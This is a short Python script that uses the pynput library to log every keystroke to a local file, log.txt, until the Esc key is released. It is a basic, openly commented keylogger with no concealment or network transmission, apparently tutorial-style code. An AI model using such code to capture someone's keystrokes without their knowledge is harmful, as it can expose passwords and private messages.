from pynput.keyboard import Key, Listener

#output File name that will log the presses
outFile = 'log.txt'

#opening the output file once
with open(outFile, 'w') as f:
    f.close()

# if a key is pressed, then write the pressed key to the log file.
def on_press(key):
    with open(outFile, 'a') as f:
        f.write('{0}\n'.format(key))
        f.close()

# if a key is released, then break out of the loop
def on_release(key):
    if key == Key.esc:
        return False

# join the press and release events.
with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
